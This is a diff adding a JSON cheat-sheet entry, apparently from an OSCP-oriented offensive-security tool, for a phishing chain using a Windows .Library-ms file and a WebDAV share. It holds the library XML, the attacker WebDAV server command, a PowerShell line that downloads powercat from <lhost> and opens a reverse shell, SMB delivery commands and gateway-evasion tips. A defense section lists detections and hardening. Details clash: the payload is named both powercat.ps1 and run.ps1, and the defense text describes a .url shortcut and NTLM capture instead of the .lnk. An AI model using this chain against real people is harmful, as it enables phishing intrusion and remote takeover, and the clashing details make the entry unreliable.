@@ -1,0 +1,108 @@
+{
+  "id": "library-ms-webdav-attack",
+  "name": "Windows Library File + WebDAV Delivery",
+  "command": "<?xml version=\"1.0\"?>\n<libraryDescription xmlns=\"http://schemas.microsoft.com/windows/2009/library\">\n  <searchConnectorDescriptionList>\n    <searchConnectorDescription>\n      <simpleLocation>\n        <url>http://<lhost></url>\n      </simpleLocation>\n    </searchConnectorDescription>\n  </searchConnectorDescriptionList>\n</libraryDescription>",
+  "description": "A two-stage no-macro phishing chain. A .Library-ms file points at an attacker WebDAV share; when the user opens it, Explorer transparently mounts the share and shows its contents as a trusted folder. A malicious shortcut (.lnk) staged on that share then runs a PowerShell payload when double-clicked. Effective where Office macros are disabled but users will open an emailed 'shortcut to a shared folder'.",
+  "type": "payload",
+  "platform": "windows",
+  "requires": [
+    "network-access"
+  ],
+  "protocols": [
+    "webdav",
+    "http"
+  ],
+  "tools": [
+    "wsgidav",
+    "powershell"
+  ],
+  "tags": [
+    "client-side",
+    "phishing",
+    "library-ms",
+    "webdav",
+    "lnk"
+  ],
+  "category": "Exploitation",
+  "subcategory": "Client-Side Attacks",
+  "certifications": [
+    "OSCP"
+  ],
+  "primary_cert": "OSCP",
+  "source": "OSCP PEN-200 Chapter 11: Client-Side Attacks",
+  "examples": [
+    {
+      "label": "config.Library-ms pointing at the WebDAV host",
+      "command": "<simpleLocation><url>http://192.168.49.128</url></simpleLocation>"
+    },
+    {
+      "label": "Start the WebDAV share (attacker)",
+      "command": "sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp/webdav --auth=anonymous"
+    },
+    {
+      "label": "Malicious .lnk target — powercat two-stage payload (chapter-canonical)",
+      "command": "powershell.exe -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://<lhost>:8000/powercat.ps1');powercat -c <lhost> -p 4444 -e powershell\"\n# Set this as the 'Target' field when creating the .lnk shortcut on Windows\n# Stage both powercat.ps1 and the .lnk on the WebDAV root"
+    },
+    {
+      "label": "Deliver .Library-ms to target via SMB share (when you have write access to a share)",
+      "command": "smbclient //<target_ip>/share -c 'put config.Library-ms'\n# Or if creds needed:\nsmbclient //<target_ip>/share -U <user>%<pass> -c 'put config.Library-ms'\n# Verify upload:\nsmbclient //<target_ip>/share -c 'dir'"
+    }
+  ],
+  "notes": "Flow: (1) run an anonymous WebDAV server and drop a .lnk (and the run.ps1 payload) in its root; (2) email the victim the small .Library-ms file; (3) opening it mounts the WebDAV path inside Explorer as a library folder; (4) the user double-clicks the .lnk, which launches PowerShell. The .Library-ms itself is tiny and passes mail filters that would strip an EXE. Stand up your listener before delivery.",
+  "references": [
+    {
+      "title": "OffSec PEN-200 - Client-Side Attacks",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    },
+    {
+      "title": "Checkymander - Weaponizing Windows Library Files",
+      "url": "https://www.ired.team/offensive-security/initial-access"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "client-recon-fingerprint",
+      "rel": "prereq",
+      "note": "Confirm the target runs Windows and has WebDAV client enabled before sending the .Library-ms."
+    },
+    {
+      "id": "webdav-transfer",
+      "rel": "prereq",
+      "note": "Same wsgidav server setup used as the delivery share."
+    },
+    {
+      "id": "office-macro-payload",
+      "rel": "alternative",
+      "note": "Use a malicious Word macro instead if the target is expected to open Office documents."
+    },
+    {
+      "id": "hta-mshta-attack",
+      "rel": "alternative",
+      "note": "Simpler single-file vector when WebDAV egress is blocked."
+    }
+  ],
+  "opsec": "loud",
+  "mitre": [
+    "T1566.001",
+    "T1204.002",
+    "T1059.001"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Windows Library files (.library-ms) define virtual folder locations including WebDAV network paths. When a user opens a Library file, Windows Explorer connects to the specified network path \u2014 triggering NTLM authentication to the attacker's WebDAV server (capturing Net-NTLMv2 hash) or downloading and displaying a search connector file. By placing a malicious .url shortcut on the WebDAV share, the icon load triggers code execution via the .url handler. The file is delivered via phishing and executes just by the user browsing the folder.",
+    "prerequisites": "Target opens or previews the .library-ms file. Outbound SMB/WebDAV (ports 139/445/80/443) not blocked to attacker. Responder or custom WebDAV server on attacker. A malicious .url shortcut file served from WebDAV.",
+    "impact": "T1566.001 Phishing: Spearphishing Attachment + T1204.002 Malicious File + T1059.001 PowerShell. Captures NTLM hash (for cracking or relay) via NTLM auth to WebDAV server, or executes code via .url shortcut handler. Minimal user interaction required \u2014 just opening or previewing the file in Explorer triggers the auth/execution.",
+    "detection": "Event 4624/4625: NTLM authentication to external/unexpected WebDAV endpoint. Sysmon Event 3: outbound SMB/WebDAV connection from explorer.exe to external IP. Sysmon Event 1: unusual child processes from explorer.exe after file preview. Proxy log: WebDAV HTTP request to external IP from Explorer. Email gateway: .library-ms attachment.\nUnusual inbound email with attachments or URLs followed by new process execution or suspicious document behavior; correlate email metadata, file creation, and network activity (DET0070/AN0188).\nMail logs with suspicious file writes or outbound connections after email delivery (AN0189).\nMac Mail app anomalies: attachments saved and immediately executed, or Safari/Preview launching files from email (AN0190).\nOffice documents with macros spawning child processes; correlate Office logs with execution and network connections (AN0191).\nAnomalous IdP login attempts from suspicious email invitations or fake SSO prompts; correlate with MFA bypass and geo anomalies (AN0192).\nSaaS-delivered phishing (chat/collaboration): anomalous link clicks, suspicious uploads, token misuse after delivery (AN0193).",
+    "artifacts": "Sysmon Event 3: explorer.exe \u2192 external WebDAV/SMB connection | Event 4624: NTLM auth to unexpected host | Sysmon Event 1: explorer.exe \u2192 child process | Proxy log: WebDAV request | Email gateway: .library-ms attachment blocked/logged",
+    "prevention": "Block outbound SMB (445, 139) to the internet (standard firewall policy). Block outbound WebDAV on port 80/443 for non-corporate URLs (web proxy filtering). Email gateway: block .library-ms attachments. Disable WebDAV client service if not needed: sc config WebClient start= disabled. MDI: NTLM auth to external targets from workstations.\nAntivirus/Antimalware: Auto-quarantine suspicious files.\nAudit: Scan systems and configurations for weaknesses.\nNetwork Intrusion Prevention: Use NIP systems to scan and block malicious email attachments or links.\nRestrict Web-Based Content: Block access to websites or attachment types (.scr, .exe, .pif, .cpl) used for phishing if not needed for business.\nSoftware Configuration: Use anti-spoofing/email authentication (SPF, DKIM, DMARC) to filter messages based on sender domain validity and message integrity.\nUser Training: Train users to identify social engineering techniques and phishing emails.",
+    "evasion": "Host WebDAV on HTTPS port 443 (less likely to be blocked). Use internal-looking WebDAV hostname. Combine with HTML smuggling to bypass email gateway inspection of the .library-ms attachment.",
+    "sources": [
+      "https://attack.mitre.org/techniques/T1566/001/",
+      "https://attack.mitre.org/techniques/T1204/002/",
+      "https://attack.mitre.org/techniques/T1059/001/"
+    ],
+    "misconfiguration": "Outbound SMB to internet not blocked. WebDAV client enabled. Email gateway doesn't block .library-ms files. No NTLM relay prevention (SMB signing not required).",
+    "vulnerable_config": "# WebDAV client running (enables .library-ms connection):\nGet-Service WebClient | Select-Object Status  # Running\n\n# Outbound SMB not blocked:\n# Firewall: allow TCP 445 outbound to ANY = VULNERABLE\n# \u2192 library-ms \u2192 WebDAV auth \u2192 NTLM hash captured\n\n# Email gateway allows .library-ms:\n# No content filtering rule for Windows Library files",
+    "secure_config": "# Disable WebDAV client (if not needed):\nStop-Service WebClient\nSet-Service WebClient -StartupType Disabled\n# Via GPO: Computer Config \u2192 Windows Settings \u2192 Security Settings \u2192 System Services\n# \u2192 WebClient: Disabled\n\n# Block outbound SMB at perimeter:\n# deny tcp internal_networks any eq 445\n# deny tcp internal_networks any eq 139\n\n# Email gateway: block .library-ms\n# Exchange transport rule:\nNew-TransportRule -Name 'Block Library Files' -AttachmentExtensionMatchesWords 'library-ms' -RejectMessageEnhancedStatusCode '5.7.1' -RejectMessageReasonText 'Library files are blocked'\n\n# Require SMB signing (prevents relay even if hash captured):\nSet-SmbServerConfiguration -RequireSecuritySignature $true -Force"
+  }
+}
